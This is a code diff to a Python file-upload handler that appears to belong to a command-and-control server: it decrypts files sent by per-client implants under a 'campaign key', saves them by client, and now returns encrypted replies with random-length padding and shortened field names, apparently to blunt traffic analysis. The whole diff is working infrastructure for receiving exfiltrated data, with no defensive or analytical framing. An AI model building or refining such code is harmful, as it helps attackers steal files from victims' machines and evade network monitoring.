@@ -18,11 +18,11 @@ class FileHandler(BaseHandler):
             self.send_error_response(400, "Missing content")
             return
             
-        encrypted_data = self.request_handler.rfile.read(content_length).decode('utf-8')
+        request_body = self.request_handler.rfile.read(content_length).decode('utf-8')
         
         try:
             # Parse the request JSON to extract data part
-            request_json = json.loads(encrypted_data)
+            request_json = json.loads(request_body)
             encrypted_data = request_json.get('d') or request_json.get('data')
             
             # Handle token field (discard padding - we don't need it)
@@ -52,8 +52,24 @@ class FileHandler(BaseHandler):
             # Save the file
             file_path = self._save_uploaded_file(client_id, decrypted_data)
             
-            # Send success response
-            self.send_success_response()
+            # Prepare success response with proper structure
+            success_response = {
+                "Status": "Success",
+                "Message": f"File uploaded successfully to {file_path}",
+                "FilePath": file_path
+            }
+            
+            # Encrypt the response
+            encrypted_response = self.crypto_helper.encrypt(json.dumps(success_response), client_id)
+            
+            # Add token padding
+            token_padding = self._generate_token_padding()
+            
+            # Send encrypted response with standardized structure
+            self.send_response(200, "application/json", json.dumps({
+                "d": encrypted_response,  # Shortened from 'data'
+                "t": token_padding        # Shortened from 'token'
+            }))
             
         except json.JSONDecodeError:
             # For backward compatibility, try directly as encrypted data
@@ -63,23 +79,73 @@ class FileHandler(BaseHandler):
                 
                 if client_id:
                     # Try to decrypt using the client's key
-                    decrypted_data = self.crypto_helper.decrypt(encrypted_data, client_id)
+                    decrypted_data = self.crypto_helper.decrypt(request_body, client_id)
                 else:
                     # Try using the campaign key
-                    decrypted_data = self.crypto_helper.decrypt(encrypted_data)
+                    decrypted_data = self.crypto_helper.decrypt(request_body)
                     client_id = self._identify_client_by_ip()  # Still need a client ID for saving
                 
                 # Save the file
                 file_path = self._save_uploaded_file(client_id or self.client_address[0], decrypted_data)
                 
-                # Send success response
-                self.send_success_response()
+                # Prepare and encrypt success response
+                success_response = {
+                    "Status": "Success",
+                    "Message": f"File uploaded successfully to {file_path}",
+                    "FilePath": file_path
+                }
+                
+                if client_id:
+                    encrypted_response = self.crypto_helper.encrypt(json.dumps(success_response), client_id)
+                else:
+                    encrypted_response = self.crypto_helper.encrypt(json.dumps(success_response))
+                
+                # Add token padding
+                token_padding = self._generate_token_padding()
+                
+                # Send response with standardized structure
+                self.send_response(200, "application/json", json.dumps({
+                    "d": encrypted_response,
+                    "t": token_padding
+                }))
             except Exception as e:
                 logger.error(f"Error handling legacy file upload: {e}")
                 self.send_error_response(500, "Server Error")
         except Exception as e:
             logger.error(f"Error handling file upload: {e}")
-            self.send_error_response(500, "Server Error")
+            
+            # Try to send an encrypted error response if we have a client ID
+            try:
+                error_response = {
+                    "Status": "Error",
+                    "Message": f"Error processing file upload: {str(e)}"
+                }
+                
+                if client_id:
+                    encrypted_error = self.crypto_helper.encrypt(json.dumps(error_response), client_id)
+                    token_padding = self._generate_token_padding()
+                    self.send_response(200, "application/json", json.dumps({
+                        "d": encrypted_error,
+                        "t": token_padding
+                    }))
+                else:
+                    self.send_error_response(500, "Server Error")
+            except:
+                self.send_error_response(500, "Server Error")
+    
+    def _generate_token_padding(self):
+        """Generate random token padding for responses"""
+        import random
+        import string
+        
+        # Generate a random length between 50 and 500 characters
+        padding_length = random.randint(50, 500)
+        
+        # Generate random padding content
+        chars = string.ascii_letters + string.digits
+        padding = ''.join(random.choice(chars) for _ in range(padding_length))
+        
+        return padding
     
     def _identify_client_by_ip(self):
         """Identify client based on IP address as fallback"""
@@ -106,7 +172,7 @@ class FileHandler(BaseHandler):
                 try:
                     file_info = json.loads(file_content)
                 except json.JSONDecodeError as e:
-                    self.logger.error(f"Error parsing JSON: {e}, content: {file_content[:100]}...")
+                    self.log_message(f"Error parsing JSON: {e}, content: {file_content[:100]}...")
                     # Not valid JSON, save as raw text
                     return self._save_raw_file(uploads_folder, file_content, client_id)
             else:
@@ -122,12 +188,12 @@ class FileHandler(BaseHandler):
                 # Not a structured file upload, save as raw text
                 return self._save_raw_file(uploads_folder, str(file_content), client_id)
         except Exception as e:
-            self.logger.error(f"Error in _save_uploaded_file: {e}")
+            self.log_message(f"Error in _save_uploaded_file: {e}")
             # Fallback to saving as raw text
             try:
                 return self._save_raw_file(uploads_folder, str(file_content), client_id)
             except Exception as e2:
-                self.logger.error(f"Error saving raw file: {e2}")
+                self.log_message(f"Error saving raw file: {e2}")
                 # Create an error file
                 error_path = os.path.join(uploads_folder, f"error_{int(time.time())}.txt")
                 with open(error_path, 'w') as f:
